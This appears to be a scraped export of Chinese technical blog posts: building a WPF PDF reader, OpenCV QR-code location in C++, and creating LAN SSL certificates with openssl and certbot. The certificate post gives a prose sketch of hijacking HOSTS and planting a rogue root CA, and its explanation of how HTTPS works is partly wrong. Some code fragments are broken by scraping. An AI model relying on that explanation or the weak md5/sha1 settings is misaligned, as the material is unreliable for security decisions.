使用C#开发pdf阅读器初探（基于WPF，没有使用开源库） ※前言 pdf是最流行的版式格式文件标准，已成为国际标准。pdf相关的开源软件非常多，也基本能满足日常需要了。相关商业软件更是林林总总，几乎应有尽有！似乎没必要自己再独立自主开发！但，本人基于以下考虑，决定自主研发一款pdf阅读器。 通过编写pdf阅读器，可以迅速的熟悉pdf文件的处理。pdf格式包含的内容非常多，仅仅通过查资料，很难掌握其内容。 任何技术，只有自主可控，才能到达气定神闲！使用开源软件是简单，万一遇到问题，就是个坑！ 解决pdf与ofd互转问题。ofd是国家标准，相关的处理软件非常少。为了解决两种格式文件互转，必须了解pdf。 本人此前开发了一款ofd阅读器，积累了一些经验。为开发pdf阅读器增添了信心。 特别说明 本人花了几周写了这款阅读器，验证了pdf不同类型的数据处理，还远远到不了商用的要求。不积跬步无以至千里！本人会慢慢完善这款软件，敬请期待。本人的参考资料有两本英文书籍和pdf英文标准文档。 程序界面： 点击下载程序 ※pdf相关参考资料： ※pdf文件结构简介 pdf总的内容结构如下： header: 有关pdf版本信息。最新版为 %PDF−1. 7 Body：存储具体数据，pdf就是由很多object组成的。每个object由dictionary和stream组成。dictionary存储就是key、alue字符对。dictionary是可以嵌套的，就是value有可能也是一个dictionary。 Cross-Reference Table：交叉索引表。可以快速定位到具体object。便于随机读取object。 Trailer：给出交叉索引表的位置。读取pdf文件都是从最后开始读的，所以Trailer一定是在文件最后。 ※pdf处理总体结构 ※object内容读取 交叉索引表能快速定位到某个object的位置，读取object内容不难，关键是分析dictionary。dictionary是可以嵌套，就是dictionary的内容还有dictionary。快速解析出所有的dictionary是处理的关键。典型的dictionary结构如下： 123456789101112131415161718&lt;&lt;/Annots 68 0 R/BleedBox [0 0 504 661.5]/Contents [51 0 R]/CropBox [0 0 504 661.5]/MediaBox [0 0 504 661.5]/Parent 4334 0 R/Resources&lt;&lt; //嵌套dictionary/ColorSpace &lt;&lt;/CS1 62 0 R&gt;&gt; //2次嵌套dictionary/Font &lt;&lt;/F1 7 0 R/F2 11 0 R/F3 13 0 R/F4 53 0 R&gt;&gt; //2次嵌套dictionary/ProcSet [/PDF/Text/ImageB/ImageC] //数组/XObject &lt;&lt;/I1 54 0 R/I2 56 0 R/I3 60 0 R&gt;&gt;//2次嵌套dictionary&gt;&gt;/Type /Page&gt;&gt; ※页面内容分析 页面内容由系列操作数和操作符组成。所有的操作数和操作符在同一个文本中，所以要快速的将操作数和操作符组成可以执行的操作对。 12345678910111213140 0 515.95 728.6 reW* n0 w2 M2 J2 j0 0 0 RGBT0 0 0 rg/FT8 180 Tf/GS13 gs0.05 0 0 -0.05 187.68 676.49 Tm&lt;35BE&gt;Tj 180 0 TD&lt;1D5F&gt;Tj 180 0 TD&lt;4205&gt;Tj 180 0 TD&lt;4EC8&gt;TjET 字符都是存在（）或&lt;&gt;中，除去字符和数字，就是操作符。如上文W*、n都是操作符；&lt;35BE&gt;为16进制字符对应的key，具体代表哪个字，需要到查字符表。这里的35BE并不是unicode字符对应的值，还需要再查表。如下图： 123456beginbfchar&lt;0019&gt; &lt;0036&gt;&lt;35BE&gt; &lt;0037&gt;&lt;001B&gt; &lt;0038&gt;&lt;001C&gt; &lt;0039&gt;endbfchar &lt;35BE&gt;对应的是&lt;0037&gt;。该表存在字体资源文件object中。 ※页面显示 ※坐标系变换 理清不同坐标系之间的关系是处理的关键。坐标系分为：Device Space（设备坐标空间）、User Space（设备坐标空间）、text space（文本坐标空间）等。 ※绘画上下文设置 当前绘画的状态（画笔、画刷等）是保存在栈中，会有入栈出栈操作。 ※特殊画刷处理 pdf有一种画刷，比如渐变色，这个很难找到现成的画刷使用。我使用的是ImageBrush，就是使用图片作为画刷。在内存中创建可擦写的图片，可以精确控制每个像素的值。根据pdf标准提供的算法，计算每个像素的值。 pdf的显示大体分为三种：曲线、文本、图片。其中曲线的显示是比较麻烦的，关键是将pdf标准的描述与wpf曲线操作对应起来。 ※pdf阅读器开发说明 如果完全参数标准文件开发，是比较枯燥，感觉慢慢长路看不到尽头。我采用是单个功能各个击破的方法，能很快见到开发成果。我使用的参考书是《PDF Explained》，100多页，只是对pdf做大体介绍，但是各个功能点都有所提及。我就参照该书提供的示例文件，逐步验证每个文件。 每种显示都有多种处理方法，每个软件生成pdf的风格是不同的。对特定的软件生成的pdf做几次验证后，基本可以保证该软件生成的pdf都可以正常显示。 wps是可以直接将doc文件转换为pdf的。我对wps生成的pdf做了测试，经过几次调试，现在基本可以正常处理wps生成的pdf文件。 ※后记 对于开发pdf阅读器这类软件，以前都是不敢想象的。像这种复杂的软件，必须遵循一定的设计模式、正确建立域模型。所以开发这类软件，对pdf标准的理解是否深刻并非关键，关键还是编程的功底。软件的外在表现千奇百态，但内在逻辑具有类比性的。继承、封装、多态、SOLID设计准则这些并不难理解，但是要达到应用自如还需要反复锤炼。把握好每个细节，正确运用设计准则，一步一个脚印，最终会将不可能变成可能！ ※相关阅读 OFD极速阅读器：免费、好用！更多功能持续完善中！","tags":"pdf wpf"},{"title":"基于opencv 识别、定位二维码 （c++版）","url":"/20240808/ji-yu-opencv-shi-bie-ding-wei-er-wei-ma-c-ban/","text":"转载自基于opencv 识别、定位二维码 （c++版） ※前言 因工作需要，需要定位图片中的二维码；我遂查阅了相关资料，也学习了opencv开源库。通过一番努力，终于很好的实现了二维码定位。本文将讲解如何使用opencv定位二维码。 定位二维码不仅仅是为了识别二维码；还可以通过二维码对图像进行水平纠正以及相邻区域定位。定位二维码，不仅需要图像处理相关知识，还需要分析二维码的特性，本文先从二维码的特性讲起。 ※二维码特性 二维码在设计之初就考虑到了识别问题，所以二维码有一些特征是非常明显的。二维码有三个“回“”字形图案，这一点非常明显。中间的一个点位于图案的左上角，如果图像偏转，也可以根据二维码来纠正。 思考题：为什么是三个点，而不是一个、两个或四个点。 一个点：特征不明显，不易定位。不易定位二维码倾斜角度。 两个点：两个点的次序无法确认，很难确定二维码是否放正了。 四个点：无法确定4个点的次序，从而无法确定二维码是否放正了。 识别二维码，就是识别二维码的三个点，逐步分析一下这三个点的特性 每个点有两个轮廓。就是两个口，大“口”内部有一个小“口”，所以是两个轮廓。 如果把这个“回”放到一个白色的背景下，从左到右，或从上到下画一条线。这条线经过的图案黑白比例大约为：黑白比例为1:1:3:1:1。 如何找到左上角的顶点？这个顶点与其他两个顶点的夹角为90度。 通过上面几个步骤，就能识别出二维码的三个顶点，并且识别出左上角的顶点。 ※使用opencv识别二维码 ※查找轮廓,筛选出三个二维码顶点 opencv一个非常重要的函数就是查找轮廓，就是可以找到一个图中的缩所有的轮廓，“回”字形图案是一个非常的明显的轮廓，很容易找到。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int QrParse::FindQrPoint(Mat&amp; srcImg, vector&lt;vector&lt;Point&gt;&gt;&amp; qrPoint)&#123; //彩色图转灰度图 Mat src_gray; cvtColor(srcImg, src_gray, CV_BGR2GRAY); namedWindow(&quot;src_gray&quot;); imshow(&quot;src_gray&quot;, src_gray); //二值化 Mat threshold_output; threshold(src_gray, threshold_output, 0, 255, THRESH_BINARY | THRESH_OTSU); Mat threshold_output_copy = threshold_output.clone(); namedWindow(&quot;Threshold_output&quot;); imshow(&quot;Threshold_output&quot;, threshold_output); //调用查找轮廓函数 vector&lt;vector&lt;Point&gt; &gt; contours; vector&lt;Vec4i&gt; hierarchy; findContours(threshold_output, contours, hierarchy, CV_RETR_TREE, CHAIN_APPROX_NONE, Point(0, 0)); //通过黑色定位角作为父轮廓，有两个子轮廓的特点，筛选出三个定位角 int parentIdx = -1; int ic = 0; for (int i = 0; i &lt; contours.size(); i++) &#123; if (hierarchy[i][2] != -1 &amp;&amp; ic == 0) &#123; parentIdx = i; ic++; &#125; else if (hierarchy[i][2] != -1) &#123; ic++; &#125; else if (hierarchy[i][2] == -1) &#123; ic = 0; parentIdx = -1; &#125; 45 &#123;47 //保存找到的三个黑色定位角 if (isQr) qrPoint.push_back(contours[parentIdx]); ic = 0; parentIdx = -1; &#125; &#125; return 0;&#125; 找到了两个轮廓的图元，需要进一步分析是不是二维码顶点，用到如下函数： 123456789101112131415bool QrParse::IsQrPoint(vector&lt;Point&gt;&amp; contour, Mat&amp; img)&#123; //最小大小限定 RotatedRect rotatedRect = minAreaRect(contour); if (rotatedRect.size.height &lt; 10 || rotatedRect.size.width &lt; 10) return false; //将二维码从整个图上抠出来 cv::Mat cropImg = CropImage(img, rotatedRect); int flag = i++; //横向黑白比例1:1:3:1:1 bool result = IsQrColorRate(cropImg, flag); return result;&#125; 黑白比例判断函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104//横向和纵向黑白比例判断bool QrParse::IsQrColorRate(cv::Mat&amp; image, int flag)&#123; bool x = IsQrColorRateX(image, flag); if (!x) return false; bool y = IsQrColorRateY(image, flag); return y;&#125;//横向黑白比例判断bool QrParse::IsQrColorRateX(cv::Mat&amp; image, int flag)&#123; int nr = image.rows / 2; int nc = image.cols * image.channels(); vector&lt;int&gt; vValueCount; vector&lt;uchar&gt; vColor; int count = 0; uchar lastColor = 0; uchar* data = image.ptr&lt;uchar&gt;(nr); for (int i = 0; i &lt; nc; i++) &#123; vColor.push_back(data[i]); uchar color = data[i]; 28 if (i == 0) &#123; lastColor = color; count++; &#125; else &#123; if (lastColor != color) &#123; vValueCount.push_back(count); count = 0; &#125; count++; lastColor = color; &#125; &#125; if (count != 0) vValueCount.push_back(count); if (vValueCount.size() &lt; 5) return false; //横向黑白比例1:1:3:1:1 int index = -1; int maxCount = -1; for (int i = 0; i &lt; vValueCount.size(); i++) &#123; if (i == 0) &#123; index = i; maxCount = vValueCount[i]; &#125; else &#123; if (vValueCount[i] &gt; maxCount) &#123; index = i; maxCount = vValueCount[i]; &#125; &#125; &#125; //黑白比例1:1:3:1:1 float rate = ((float)maxCount) / 3.00; cout &lt;&lt; &quot;flag:&quot; &lt;&lt; flag &lt;&lt; &quot; &quot;; float rate2 = vValueCount[index - 2] / rate; cout &lt;&lt; rate2 &lt;&lt; &quot; &quot;; if (!IsQrRate(rate2)) return false; rate2 = vValueCount[index - 1] / rate; cout &lt;&lt; rate2 &lt;&lt; &quot; &quot;; if (!IsQrRate(rate2)) return false; rate2 = vValueCount[index + 1] / rate; cout &lt;&lt; rate2 &lt;&lt; &quot; &quot;; if (!IsQrRate(rate2)) return false; rate2 = vValueCount[index + 2] / rate; cout &lt;&lt; rate2 &lt;&lt; &quot; &quot;; if (!IsQrRate(rate2)) return false; return true;&#125;//纵向黑白比例判断 省略bool QrParse::IsQrColorRateY(cv::Mat&amp; image, int flag)&#123;&#125;bool QrParse::IsQrRate(float rate)&#123; //大概比例 不能太严格 return rate &gt; 0.6 &amp;&amp; rate &lt; 1.9;&#125; ※确定三个二维码顶点的次序 通过如下原则确定左上角顶点：二维码左上角的顶点与其他两个顶点的夹角为90度。 123456789101112131415161718192021222324252627282930313233343536373839/ pointDest存放调整后的三个点，三个点的顺序如下// pt0----pt1// // pt2bool QrParse::AdjustQrPoint(Point* pointSrc, Point* pointDest)&#123; bool clockwise; int index1[3] = &#123; 2,1,0 &#125;; int index2[3] = &#123; 0,2,1 &#125;; int index3[3] = &#123; 0,1,2 &#125;; for (int i = 0; i &lt; 3; i++) &#123; int *n = index1; if(i==0) n = index1; else if (i == 1) n = index2; else n = index3; 23 if (angle &gt; 80 &amp;&amp; angle &lt; 99) &#123; pointDest[0] = pointSrc[n[2]]; if (clockwise) &#123; pointDest[1] = pointSrc[n[0]]; pointDest[2] = pointSrc[n[1]]; &#125; else &#123; pointDest[1] = pointSrc[n[1]]; pointDest[2] = pointSrc[n[0]]; &#125; return true; &#125; &#125; return true;&#125; ※通过二维码对图片矫正。 图片有可能是倾斜的，倾斜夹角可以通过pt0与pt1连线与水平线之间的夹角确定。二维码的倾斜角度就是整个图片的倾斜角度，从而可以对整个图片进行水平矫正。 123456789//二维码倾斜角度Point hor(pointAdjust[0].x+300,pointAdjust[0].y); //水平线double qrAngle = QrParse::Angle(pointAdjust[1], hor, pointAdjust[0], clockwise);//以二维码左上角点为中心 旋转Mat drawingRotation = Mat::zeros(Size(src.cols,src.rows), CV_8UC3);double rotationAngle = clockwise? -qrAngle:qrAngle;Mat affine_matrix = getRotationMatrix2D(pointAdjust[0], rotationAngle, 1.0);//求得旋转矩阵warpAffine(src, drawingRotation, affine_matrix, drawingRotation.size()); ※二维码相邻区域定位 一般情况下，二维码在整个图中的位置是确定的。识别出二维码后，根据二维码与其他图的位置关系，可以很容易的定 ※后记 作者通过查找大量资料，仔细研究了二维码的特征，从而找到了识别二维码的方法。网上也有许多识别二维码的方法，但是不够严谨。本文是将二维码的多个特征相结合来识别，这样更准确。这种识别方法已应用在公司的产品中，识别效果还是非常好的","tags":"opencv c++ qrcode"},{"title":"自建数字签名证书","url":"/20240808/zi-jian-shu-zi-qian-ming-zheng-shu/","text":"局域网内搭建浏览器可信任的SSL证书[1] 首先是为什么要干这个事情，你可能会说随便搞个自签名证书难道不能用吗？答案是还真的不能用，的确对于开发来说搞个自签名的证书就行了。但是一旦放到生产环境浏览器对证书有效性进行验证的时候便是不可信状态，这时就必须要用户点击一下继续访问，但是对于我们即将实施项目的自动化要求来说没法这样干。你可能又会说了现在这个环境在阿里云、华为云这些平台上随便申请一个免费的证书难道不行吗？答案是真的不行，因为项目的特殊要求最终我们部署的环境是完全没有外网访问的，就只能在局域网环境下运行及意味着不光是SSL证书的问题我们连DNS服务器都要自己建。这时候你可能又要说了那么直接用http访问就可以了，干嘛要用ssl证书呀？答案是这个项目需要使用WebRTC进行音视频多人会议，而WebRTC只能在https下运行。 其实上面的说法有一个点需要更正一下，自签名证书其实也可以但是一旦对超过100个客户端进行分发简直是要命的事情，所以我们通过Windows域控的方式统一对下属计算机进行证书分发保证可用性。 ※1.原理 SSL证书的信任机制其实是非常简单的，第一需要一个机构证书，第二是需要服务端证书，一般来说机构证书被称为CA证书，而服务端证书就称为服务器证书吧。那么为啥https非常安全呢？答案其实不复杂，下面就是一段逻辑性描述来说明为啥https是安全的。 通常情况下我们在给Nginx、Tomcat、IIS上配置的证书便是服务器证书，那么它是怎么保证客户端访问的地址绝对没有被拦截修改的呢？其实也不复杂，当我们的浏览器发起一个请求的时候到服务端上时，对应web服务器会通过证书的秘钥将http响应值进行一次加密，然后将密文与明文同时返回出来，客户端浏览器接收到响应之后会将密文对称解码然后和明文进行对比，这样一来便可以保证响应值没有被串改。 这个时候逻辑上稍微厉害一点都会发现一个问题，客户端是怎么解码的？这里的答案就是服务端在响应的时候同时会将证书的公钥也返回，这个公钥只能解码对应私钥加密的信息，同时这个公钥无法加密只能解密，这样一来如果如果某人想要拦截http请求便必须知道对应的私钥才行，否则浏览器一旦发现解密信息对不上便知道了响应数据已经被拦截修改过了。 如果你反应过来了你会发现一个新的问题，那么假设拦截这自己搞了一对有效的私钥和公钥然后伪装为服务器不就行了，恭喜你盲生发现了华点。这里就需要CA证书来处理了。其实服务器证书的公钥是由CA证书的秘钥配对加密来的，这样一来当请求返回的服务器公钥和通过CA证书进行验证时便会发现这个公钥是不是由机构签发的公钥，一旦对应不上则说明服务器不是原来CA证书签发服务器证书，这就证明你的请求被第三方拦截了。同时CA证书对于浏览器而言只有公钥，也就是说安装证书时本质上就是将CA证书的公钥导入到你的电脑上了，至此除开CA机构的证书发放者没有知道CA证书的秘钥是什么这样一来便可以保证下面几个非常关键的安全性： 你请求的服务绝对是官方的服务器，绝对不是黑客自建的服务器。 服务器响应给你的数据绝对是正确的，期间黑客绝对无法对其进行修改。 证书的结构如下： 这里还有一个问题便是这些CA证书是哪来的，自己的电脑上又重来没有导入过什么证书。这里便是一个非常无耻躺着赚钱的商业模式了，微软、谷歌、苹果等公司提供了操作系统和浏览器，他们便是第一方的CA机构，他们的系统自己肯定信任自己对吧？所以系统安装的时候他们的CA公钥已经安装到你们的系统里面了，然后这几家巨头合伙说那么这些CA公钥在每种系统都有，然后就是一写第三方公司和这些巨头打成了合作，这些公司的机构证书也被巨头们信任所以理所当然的入库了，这些三方机构便是大名鼎鼎的Symantec、GeoTrust几个巨头，这些机构一个单域名的签名证书都敢直接拿出来卖，一年好几千，对他们而言无法就是给下发的证书进行一次签名而已，真正的躺着赚钱。 ※2.开始制作证书 这里我使用的证书工具是openssl，经典工具，坦白的说非常难用。 ※2.1创建CA证书 首先第一步肯定是制作一个机构证书也就是CA证书出来，这里有两种方案，第一是直接用openssl创建CA证书，另一种是windows域控生成域组织的CA证书，我们分开说。 ※2.1.1通过openssl创建CA证书 第一步是创建一个秘钥，这个便是CA证书的根本，之后所有的东西都来自这个秘钥： 12# 通过rsa算法生成2048位长度的秘钥openssl genrsa -out myCA.key 2048 第二步是通过秘钥加密机构信息形成公钥： 123# 公钥包含了机构信息，在输入下面的指令之后会有一系列的信息输入，这些信息便是机构信息，公司名称地址什么的# 这里还有一个过期信息，CA证书也会过期，openssl默认是一个月，我们直接搞到100年openssl req -utf8 -new -x509 -key myCA.key -out myCA.cer -days 36500 这一步需要输入的机构信息有点，分别说一下： 参数名称 参数值 Country Name 国家代码，比如中国就是CN State or Province Name 省名称 Locality Name 城市名称 Organization Name 机构名称 Organizational Unit Name 机构单位名称 Common Name 重点参数：授权给什么，因为机构是根节点所以是授权给自己 Email Address 邮件地址 ※2.1.2通过windows域控创建CA证书 这种便是我采用的方案，执行上比直接用openssl创建证书复杂多了，但是好处也非常多，一方面域控下级的所有计算机天然对域控服务就是信任状态，第二是域控制器能够通过组策略域内同步CA证书，本质上来讲相对于多了一个CA证书同步与分发的机制。我这边使用的Windows Server 2016，其他版本区别也不大。 第一步是在域控上启用证书服务 第二步是安装完毕之后配置证书 这里非常简单，我都不想说了，直接根据提示输入相关信息就行了，在过期时间那一步最好将时间拉长，我还是使用的100年。 第三步是通过组策略进行分发 策略路径是：计算机策略/Windows设置/安全设置/公钥策略/受信任的根证书颁发机构和计算机策略/Windows设置/安全设置/公钥策略/受信任的发布者证书。将上面创建的证书导出之后，在这里导入即可。 ※2.2创建服务器证书 在得到CA证书之后，需要通过openssl工具对证书进行转换得到公钥（.crt文件）和密钥（.key文件），无论CA证书是怎么来的到这里之后就没有任何区别了，服务器证书的制作流程相较CA证书要复杂一点点。 第一步通过openssl工具创建服务器的秘钥： 12# 通过RSA算法生成长度2048位的秘钥openssl genrsa -out server.key 2048 第二步这里是创建一个签名请求 需要将服务器信息写入到请求文件之中，然后通过CA机构证书对请求签名形成服务器证书公钥，这一步要复杂一些，很多网上的教程在这里都GG了主要原因没有把原理搞清楚。 首先https证书的公钥不同于自定义情况下的加密证书，这里需要安装浏览器标准进行配置，首先openssl默认的证书版本是V1，V1在支持https时部分浏览器依旧会认为不安全，所以需要使用V3版本；同时openssl即便是使用V3版本依旧没有附带V3的subjectAltName字段数据（这里是证书对应的IP地址或者域名，可以用通配符）。但是这些东西命令行没法指定所以需要配置文件，我这里准备了一个： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146# openssl.cnftsa_policy2 = 1.2.3.4.5.6tsa_policy3 = 1.2.3.4.5.7[ ca ]default_ca = CA_default # The default ca section[ CA_default ]dir = ./demoCA # Where everything is keptcerts = $dir/certs # Where the issued certs are keptcrl_dir = $dir/crl # Where the issued crl are keptdatabase = $dir/index.txt # database index file.new_certs_dir = $dir/newcerts # default place for new certs.certificate = $dir/cacert.pem # The CA certificateserial = $dir/serial # The current serial numbercrlnumber = $dir/crlnumber # the current crl numbercrl = $dir/crl.pem # The current CRLprivate_key = $dir/private/cakey.pem# The private keyRANDFILE = $dir/private/.rand # private random number filex509_extensions = usr_cert # The extentions to add to the certname_opt = ca_default # Subject Name optionscert_opt = ca_default # Certificate field optionsdefault_days = 365 # how long to certify fordefault_crl_days= 30 # how long before next CRLdefault_md = default # use public key default MDpreserve = no # keep passed DN orderingpolicy = policy_match[ policy_match ]countryName = matchstateOrProvinceName = matchorganizationName = matchorganizationalUnitName = optionalcommonName = suppliedemailAddress = optional[ policy_anything ]countryName = optionalstateOrProvinceName = optionallocalityName = optionalorganizationName = optionalorganizationalUnitName = optionalcommonName = suppliedemailAddress = optional[ req ]default_bits = 1024default_keyfile = privkey.pemdistinguished_name = req_distinguished_nameattributes = req_attributesx509_extensions = v3_ca # The extentions to add to the self signed certstring_mask = utf8onlyreq_extensions = v3_req # The extensions to add to a certificate request[ req_distinguished_name ]countryName = Country Name (2 letter code)countryName_default = CNcountryName_min = 2countryName_max = 2stateOrProvinceName = State or Province Name (full name)stateOrProvinceName_default = BeiJinglocalityName = Locality Name (eg, city)0.organizationName = Organization Name (eg, company)0.organizationName_default = mycaorganizationalUnitName = Organizational Unit Name (eg, section)commonName = Common Name (e.g. server FQDN or YOUR name)commonName_max = 64emailAddress = Email AddressemailAddress_max = 64[ req_attributes ]challengePassword = A challenge passwordchallengePassword_min = 4challengePassword_max = 20unstructuredName = An optional company name[ usr_cert ]basicConstraints=CA:FALSEnsCertType = client, email, objsignkeyUsage = nonRepudiation, digitalSignature, keyEnciphermentnsComment = &quot;OpenSSL Generated Certificate&quot;subjectKeyIdentifier=hashauthorityKeyIdentifier=keyid,issuer[ svr_cert ]basicConstraints=CA:FALSEnsCertType = serverkeyUsage = nonRepudiation, digitalSignature, keyEncipherment, dataEncipherment, keyAgreementsubjectKeyIdentifier=hashauthorityKeyIdentifier=keyid,issuerextendedKeyUsage = serverAuth,clientAuth[ v3_req ]subjectAltName = @alt_names# 这里是重点，需要将里面配置为最终服务端需要的域名或者IP# 这里可以写多个，能够自行添加DNS.X = XXXXXX[ alt_names ]DNS.1 = xunshi.comDNS.2 = *.xunshi.comIP.1 = 192.168.0.2IP.2 = 192.168.0.3[ v3_ca ]subjectKeyIdentifier=hashauthorityKeyIdentifier=keyid:always,issuerbasicConstraints = CA:true[ crl_ext ]authorityKeyIdentifier=keyid:always[ proxy_cert_ext ]basicConstraints=CA:FALSEnsComment = &quot;OpenSSL Generated Certificate&quot;subjectKeyIdentifier=hashauthorityKeyIdentifier=keyid,issuerproxyCertInfo=critical,language:id-ppl-anyLanguage,pathlen:3,policy:foo[ tsa ]default_tsa = tsa_config1 # the default TSA section[ tsa_config1 ]dir = ./demoCA # TSA root directoryserial = $dir/tsaserial # The current serial number (mandatory)crypto_device = builtin # OpenSSL engine to use for signingsigner_cert = $dir/tsacert.pem # The TSA signing certificate # (optional)certs = $dir/cacert.pem # Certificate chain to include in reply # (optional)signer_key = $dir/private/tsakey.pem # The TSA private key (optional)default_policy = tsa_policy1 # Policy if request did not specify it # (optional)other_policies = tsa_policy2, tsa_policy3 # acceptable policies (optional)digests = md5, sha1 # Acceptable message digests (mandatory)accuracy = secs:1, millisecs:500, microsecs:100 # (optional)clock_precision_digits = 0 # number of digits after dot. (optional)ordering = yes # Is ordering defined for timestamps? # (optional, default: no)tsa_name = yes # Must the TSA name be included in the reply? # (optional, default: no)ess_cert_id_chain = no # Must the ESS cert id chain be included? # (optional, default: no) 将上面的配置内容保存为openssl.cnf放到生成的服务器证书文件的目录下（注意：修改alt_names里面的域名或者IP为最终部署需要的地址，支持通配符），然后执行创建签名申请文件即可，执行运行： 123# 和创建CA时一样这里需要输入一堆服务器信息，输入项也是相同的。# 不过在输入Common Name（CN）最好直接输入服务器的IP地址或者域名。openssl req -utf8 -config openssl.cnf -new -out server.req -key server.key PS：上述配置文件使用sha1算法生产的证书，部分浏览器已经已经不信任该算法了，如果你使用的时候遇到sha1相关的问题，可以参考评论区的kevin同学提供的方案。 如果你遇到sha1问题，用稍微新一点的openssl.cnf文件 https://github.com/openssl/openssl/blob/master/apps/openssl.cnf 同时还要在这个文件里稍微改一下，把下述的配置加入进去 1234567[ v3_req ] subjectAltName = @alt_names # 这里是重点，需要将里面配置为最终服务端需要的域名或者IP # 这里可以写多个，能够自行添加DNS.X = XXXXXX [ alt_names ] DNS.1 = xunshi.com DNS.2 = *.xunshi.com 加上。 最后用请求生成密钥的时候 用下面这个指令 使用sha384代替默认的sha1 openssl x509 -req -extfile openssl.cnf -extensions v3_req -in server.req -out server.cer -CAkey myCA.key -CA myCA.cer -sha384 -days 36500 -CAcreateserial -CAserial serial 第三步通过CA机构证书对服务器证书进行签名认证 12# 这里没有什么需要说的，本质上就是将签名请求文件进行签名最终得到服务器的公钥openssl x509 -req -extfile openssl.cnf -extensions v3_req -in server.req -out server.cer -CAkey myCA.key -CA myCA.cer -days 36500 -CAcreateserial -CAserial serial 第四步部署证书 这里应该没有什么需要说的了，我们通过Nginx部署，最终得到server.key就是秘钥，server.cer文件就是公钥只需要配置给Nginx就行了。 ※3.信任CA机构证书 如果通过Windows域控创建的CA证书，其证书本身通过组策略便可以给每一个域下计算机添加机构信任。如果你没有域控只是通过openssl创建的CA证书也没有关系，只需要将CA证书的公钥（myCA.cer文件）导入到系统信任的根证书颁发机构里面就行了： 这个界面在windows的internet选型-&gt;内容-&gt;证书可以打开，导入即可，也可以直接双击cer文件进行证书安装，最终不光是windows系统，任何操作系统都可以安装证书来进行对CA机构的进行信任操作。 在对证书进行信任之后通过https打开浏览器进入内网DNS或者host配置的域名便可以得到没有任何警告的内容的安全连接： 如果是Mac系统访问逻辑也是一样的通过安装CA证书并且在钥匙串内添加信任之后依然可以正常访问： 在Android手机上也是一样，安装并且信任证书之后可以正常访问： ※4.总结 本来对我对https的认证逻辑其实理解没有多深入，以前也只是用过SSL证书进行TCP传输加密而已，经过对openssl的学习现在至少在理解上达到了及格水平，不过这次学习论证与探索的过程我个人极其不愉快，本来这东西在有了理解之后大家都看得出来不是什么很难的东西，事实上我也只用了一天半就搞定了。但是网上充斥大量垃圾内容，不光没有什么正向内容甚至不少内容还TM起了误导的作用，整个中文互联网检索体系下就没有找到一篇文章稍微详细描述整个搭建逻辑与流程，简直了，最终我只能从https原理和openssl的官方文档开始看起，过于离谱了。基本上可以得到一个结论现在天天写一些所谓干货的博主简直就是滥竽充数，其内容千篇一律大多数也是抄袭来的基本上什么都没有说清楚简直浪费时间。 最后说一下https的原理，在解释清楚之后其实不是绝对上的安全，结合本文各位可以想一下怎样去伪造一个页面出来？假设我是黑客来搞入侵其实只需要一个小小的脚本就可以了，我们自行制作CA和服务证书之后，通过修改HOST文件对域名解析进行劫持将其引导到我们自己的服务器，然后将我们自己制作CA证书注入目标电脑的受信任证书组，这样一来对于被入侵者已经看到是安全连接但是其请求已经被我们拦截了。所以各位不要看到https就以为安全了，一旦你的电脑本身就被入侵了那么https也是形同虚设的，所以在执行高风险操作的时候最好还是点开站点的证书看看对应的CA机构是不是被修改过。 免费的Let’s Encrypt证书[2] 一个比较离谱的事情发生了，我每年在阿里云搞得免费证书现在有效期只有3个月，相当于我TM每三个月就要去手动更新一下证书，之前的博客也写了SSL这个东西简直就是一本万利的事情（局域网内搭建浏览器可信任的SSL证书），这种完全不能忍，所以拜拜了资本家，老子不用你了，免费证书不香吗？ Let’s Encrypt就是免费证书的代表，这玩意几乎所有设备都支持，并且能申请通配证书，步骤如下： ※安装snapd，这是为了安装certbot的工具 123yum install snapdsystemctl enable --now snapd.socketln -s /var/lib/snapd/snap /snap ※安装certbot，这个工具就是拿来申请证书的 12snap install --classic certbotln -s /snap/bin/certbot /usr/bin/certbot ※申请证书 1certbot certonly --manual --preferred-challenges dns 在运行这个命令之后会开始证书的申请步骤，具体如下： 如果需要提供邮箱就按照提示输入邮箱即可； 按照提示输出域名，用空格分隔多个域名 注意：tangyuecan.com和www.tangyuecan.com是两个不同的域名，如果使用通配域名就是*.tangyuecan.com 通过提示进行DNS验证，这里按照要求添加一个TXT解析即可 注意：连续超过5次解析失败，服务器在未来五个小时都无法继续申请 成功之后就会生成对应的证书文件； ※使用证书 certbot 生成的证书文件很多，其中对于nginx等常规的web server就只有两个有用： fullchain.pem：这个是证书文件，兼容大部分web server； privkey.pem：这个是秘钥文件； 以nginx为例，最终使用证书配置如下： 123456789101112131415161718192021server &#123; listen 443 ssl http2 default_server; listen [::]:443 ssl http2 default_server; server_name tangyuecan.com; ssl_certificate /ssl/fullchain.pem; ssl_certificate_key /ssl/privkey.pem; root /var/www/html; index index.php; location / &#123; try_files $uri $uri/ /index.php?$args; &#125; location ~ .php$ &#123; include fastcgi.conf; fastcgi_intercept_errors on; fastcgi_pass xxx.xxx.xxx.xxx:xxxx; &#125;&#125; ※自动更新证书 没有想到吧，还有这个功能，原理也很简单，但是使用上存在一个问题，每一次更新的证书的时候都需要对域名所有权进行一次校验，只有通过了校验Let’s Encrypt才会知道这个域名是你在管理，进而才会为你更新证书，上文使用DNS进行验证的话，运行renew进行重新校验可能是没法通过的，因为certbot无法访问你的DNS解析对吧，所以这里最佳方案是通过web服务器进行验证。 12certbot certonly --webroot -w /var/www/example -d www.example.com -d example.com --dry-run# 其中--dry-run的意思是测试，正式更新的时候去掉就行了；-w指的是webroot的路径，对应-d就是该路径下的域名，明显一个路径下有多个域名 特别注意：如果你使用了泛域名解析就不能直接通过webroot进行更新证书，毕竟泛域名不大可能指向同一个webroot路径，这种情况下想要实现自动更新证书只有通过DNS插件才能实现，可以参考这个项目 https://www.tangyuecan.com/2021/12/17/局域网内搭建浏览器可信任的ssl证书/ ↩︎ https://www.tangyuecan.com/2023/12/03/免费的lets-encrypt证书/ ↩︎","tags":"数字签名证书 let’s-encrypt证书 ssl证书"},{"title":"MFC集成CEF3窗口","url":"/20240808/mfc-ji-cheng-cef3-chuang-kou/","text":"转载自 MFC集成CEF3窗口 ※前言 